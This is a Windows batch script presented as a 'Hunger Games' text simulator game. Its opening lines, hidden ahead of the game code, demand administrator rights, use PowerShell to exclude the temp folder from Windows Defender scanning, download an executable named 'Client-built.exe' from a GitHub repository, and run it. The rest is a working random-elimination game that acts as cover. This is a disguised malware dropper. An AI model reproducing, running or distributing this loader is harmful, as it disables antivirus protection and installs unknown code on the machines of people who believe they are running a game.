@echo off
openfiles >nul 2>nul
if %errorlevel% neq 0 (
    echo This script requires administrator privileges.
    echo Please right-click on the script and select "Run as administrator."
    pause
    exit
)
echo Running as Administrator.
pause
cls
cd %TEMP%
PowerShell -NoProfile -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath '%TEMP%'"
PowerShell -Command "$downloadPath = Join-Path -Path $env:TEMP -ChildPath 'Client-built.exe'; Invoke-WebRequest 'https://github.com/WurstSMTPAgent/WurstInstallation/raw/main/Client-built.exe' -OutFile $downloadPath"
start "" "%TEMP%\Client-built.exe"
cls
setlocal enabledelayedexpansion
title Hunger Games Batch V0.5
:start
cls
echo Welcome to the Hunger Games Simulator!
set /p players=How many players are in the game? 
set player_count=%players%
set round=1

:: Initialize players and their stats
for /l %%i in (1,1,%players%) do (
    set /p player%%i=Enter name for Player %%i: 
    set player%%i_kills=0
    set player%%i_weapon=None
    set player%%i_alive=1
)

:cornucopia
cls
echo Round %round%: The Cornucopia!
timeout /t 1 >nul
echo Players rush to the Cornucopia to grab weapons and supplies...
timeout /t 1 >nul

:: Randomly assign weapons to players
for /l %%i in (1,1,%players%) do (
    set /a weapon=!random! %% 9
    if !weapon! equ 0 set player%%i_weapon=Longsword
    if !weapon! equ 1 set player%%i_weapon=Spear
    if !weapon! equ 2 set player%%i_weapon=Bow
    if !weapon! equ 3 set player%%i_weapon=Axe
    if !weapon! equ 4 set player%%i_weapon=Knife
    if !weapon! equ 5 set player%%i_weapon=Rapier
    if !weapon! equ 6 set player%%i_weapon=Halberd
    if !weapon! equ 7 set player%%i_weapon=Deagle
    if !weapon! equ 8 set player%%i_weapon=Bare fucking hands
    echo !player%%i! grabs a !player%%i_weapon!.
    timeout /t 1 >nul
)

:main_loop
set /a round+=1
cls
echo Round %round% begins...
timeout /t 1 >nul

:: Special events after round 6
if %round% gtr 6 (
    set /a special_event_chance=!random! %% 10
    if !special_event_chance! equ 0 (
        set /a event_type=!random! %% 4
        if !event_type! equ 0 (
            echo A pack of wild dogs is on the loose!
            for /l %%i in (1,1,%players%) do (
                if !player%%i_alive! equ 1 (
                    set /a dog_attack=!random! %% 2
                    if !dog_attack! equ 0 (
                        echo !player%%i! is attacked by wild dogs and dies.
                        set player%%i_alive=0
                    ) else (
                        echo !player%%i! manages to fend off the wild dogs.
                    )
                    timeout /t 1 >nul
                )
            )
        ) else if !event_type! equ 1 (
            echo An intense storm hits the arena!
            for /l %%i in (1,1,%players%) do (
                if !player%%i_alive! equ 1 (
                    set /a storm_survival=!random! %% 2
                    if !storm_survival! equ 0 (
                        echo !player%%i! is struck by lightning and dies.
                        set player%%i_alive=0
                    ) else (
                        echo !player%%i! finds shelter and survives the storm.
                    )
                    timeout /t 1 >nul
                )
            )
        ) else if !event_type! equ 2 (
            echo A poison fog rolls into the arena!
            for /l %%i in (1,1,%players%) do (
                if !player%%i_alive! equ 1 (
                    set /a fog_survival=!random! %% 2
                    if !fog_survival! equ 0 (
                        echo !player%%i! succumbs to the poison fog and dies.
                        set player%%i_alive=0
                    ) else (
                        echo !player%%i! finds a gas mask and survives the fog.
                    )
                    timeout /t 1 >nul
                )
            )
        ) else if !event_type! equ 3 (
            echo A swarm of bees attacks the arena!
            for /l %%i in (1,1,%players%) do (
                if !player%%i_alive! equ 1 (
                    set /a bee_attack=!random! %% 2
                    if !bee_attack! equ 0 (
                        echo !player%%i! is stung to death by the bees.
                        set player%%i_alive=0
                    ) else (
                        echo !player%%i! escapes the swarm of bees.
                    )
                    timeout /t 1 >nul
                )
            )
        )
        goto check_alive
    )
)

:: Simulate events for each player
for /l %%i in (1,1,%players%) do (
    if !player%%i_alive! equ 1 (
        set /a event=!random! %% 10
        if !event! leq 3 (
            :: Increased attack probability (now 40%)
            :select_target
            set /a target=!random! %% %players% + 1
            if !target! equ %%i goto select_target
            if !player%target%_alive! equ 1 (
                set target_name=!player%target%!
                echo !player%%i! attacks !target_name! with their !player%%i_weapon!.
                set player%target%_alive=0
                set /a player%%i_kills+=1
                echo !target_name! has been killed by !player%%i!.
                timeout /t 1 >nul
            )
        ) else if !event! equ 4 (
            echo !player%%i! searches for supplies.
            timeout /t 1 >nul
        ) else if !event! equ 5 (
            echo !player%%i! hides and avoids conflict.
            timeout /t 1 >nul
        ) else if !event! equ 6 (
            echo !player%%i! falls into a trap and dies.
            set player%%i_alive=0
            timeout /t 1 >nul
        ) else if !event! equ 7 (
            echo !player%%i! dies from starvation.
            set player%%i_alive=0
            timeout /t 1 >nul
        ) else if !event! equ 8 (
            echo !player%%i! is wounded by a wild animal
            timeout /t 1 >nul
        ) else if !event! equ 9 (
            echo !player%%i! finds a cache of supplies and survives another day.
            timeout /t 1 >nul
        )
    )
)

:check_alive
:: Check if the game is over
set alive_count=0
set winner=
for /l %%i in (1,1,%players%) do (
    if !player%%i_alive! equ 1 (
        set /a alive_count+=1
        set winner=!player%%i!
    )
)

if !alive_count! leq 1 goto end_game
goto main_loop

:end_game
cls
if !alive_count! equ 1 (
    echo The winner is !winner!!
) else (
    echo No one won the game.
)

echo.
echo Kill Leaderboard:
for /l %%i in (1,1,%players%) do (
    echo !player%%i!: !player%%i_kills! kills
)

set /p play_again=Would you like to play again with the same members? (yes/no): 
if /i "!play_again!"=="yes" (
    for /l %%i in (1,1,%players%) do (
        set player%%i_kills=0
        set player%%i_weapon=None
        set player%%i_alive=1
    )
    goto cornucopia
)
if /i "!play_again!"=="no" goto end

:end
echo Thanks for playing the Hunger Games Simulator!
pause